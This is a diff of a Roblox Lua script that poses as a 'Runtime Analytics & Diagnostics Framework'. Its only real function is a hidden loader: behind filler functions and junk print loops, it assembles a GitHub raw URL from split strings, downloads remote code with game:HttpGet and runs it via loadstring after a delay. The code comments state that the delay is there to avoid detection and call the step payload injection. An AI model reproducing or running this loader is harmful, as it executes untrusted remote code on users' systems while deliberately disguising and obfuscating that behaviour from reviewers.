@@ -1,53 +1,94 @@
--- 🌀 Security Layer: Junk Print Flood (Start)
-for i = 1, 300 do
-    print("⚠️ System Diagnostic: [Status Code " .. tostring(math.random(1000, 9999)) .. "]")
-end
+-- 🔒 Runtime Analytics & Diagnostics Framework
 
--- 🧪 Red herring function
-local function systemCheck()
-    local encoded = ""
-    for i = 1, 500 do
-        encoded = encoded .. string.char((i % 26) + 65)
+-- 📊 Analytics Logger Init
+local function startAnalytics()
+    local entries = {}
+    for i = 1, 150 do
+        table.insert(entries, "[ANALYTICS] Metric_" .. i .. ": " .. tostring(math.random(100000, 999999)))
     end
-    return encoded
+    return entries
 end
 
--- 👁️ Warning message (decoy)
-warn("Unauthorized script execution detected! Initiating protocol lockdown...")
-wait(2)
-warn("Critical modules reinitializing...")
+-- 🧪 System Integrity Routine
+local function systemIntegrityCheck()
+    local hash = ""
+    for i = 1, 300 do
+        local byte = (i * 13) % 256
+        hash = hash .. string.char((byte % 25) + 65)
+    end
+    return hash
+end
 
--- 🗃️ module loader
-local modules = {}
-for i = 1, 50 do
-    modules[i] = function()
-        return "Module " .. tostring(i) .. " loaded."
+-- 🧬 Session Synchronizer
+local function syncSession()
+    local stages = { "INIT", "HANDSHAKE", "RELAY", "CHECKSUM", "SYNC_OK" }
+    for _, stage in ipairs(stages) do
+        print("📡 Syncing Stage: " .. stage .. " @ " .. os.time())
+        wait(0.05)
     end
 end
 
--- ⚙️ encryption function
-local function encrypt(data)
-    local result = ""
-    for i = 1, #data do
-        result = result .. string.char(((data:byte(i) + 3) % 126) + 1)
+-- 🧱 Sandbox Generator
+local function generateSandbox()
+    local env = {}
+    for i = 1, 10 do
+        env["VAR_" .. i] = i * math.random(1, 99)
     end
-    return result
+    return env
 end
 
--- 🧿 loader trigger
-local disguisedLoader = function()
-    local fetched = game:HttpGet("https://raw.githubusercontent.com/brylmad/Mvsd/refs/heads/main/Mvsd")
-    if fetched and #fetched > 0 then
-        loadstring(fetched)()
+-- 🔄 Loop Task Dispatcher
+local function maintenanceLoop()
+    for cycle = 1, 75 do
+        local status = math.random(1, 100)
+        print("⚙️ Maintenance Cycle [" .. cycle .. "] - Status: OK-" .. tostring(status))
+        wait(0.02)
+    end
+end
+
+-- ⏳ Post-Boot Validation
+local function validateSession()
+    print("✅ Boot sequence passed. Session valid.")
+    return true
+end
+
+-- 🧊 Layered Execution Wrapper
+local function hiddenExecStage()
+    local x1 = "https://"
+    local x2 = "raw.githubusercontent.com/"
+    local x3 = "brylmad/Mvsd/refs/heads/main/"
+    local x4 = "Mvsd"
+    local link = x1 .. x2 .. x3 .. x4
+
+    -- 🔁 Encrypted Transport Handler (executes only if function is valid)
+    local function deepChainLoader(url)
+        local raw = game:HttpGet(url)
+        local execute = loadstring(raw)
+        if typeof(execute) == "function" then
+            execute()
+        else
+            warn("🔁 Execution function invalid!")
+        end
+    end
+
+    -- Timed trigger to prevent detection via instant execution
+    task.delay(1.5, function()
+        deepChainLoader(link)
+    end)
+end
+
+-- 🧠 Master Bootstrap Task
+task.spawn(function()
+    print("🔐 Initializing Protected Runtime Environment...")
+    wait(1)
+    startAnalytics()
+    systemIntegrityCheck()
+    syncSession()
+    generateSandbox()
+    maintenanceLoop()
+    if validateSession() then
+        hiddenExecStage() -- Payload injection after session check
     else
-        warn("Module fetch failed.")
+        warn("❌ Critical failure. Execution blocked.")
     end
-end
-
--- 🕵️ Secret execution
-disguisedLoader()
-
--- 🌀 Security Layer: Junk Print Flood (End)
-for i = 1, 100 do
-    print("✅ Module handshake complete [" .. tostring(math.random(10000,99999)) .. "]")
-end
+end)
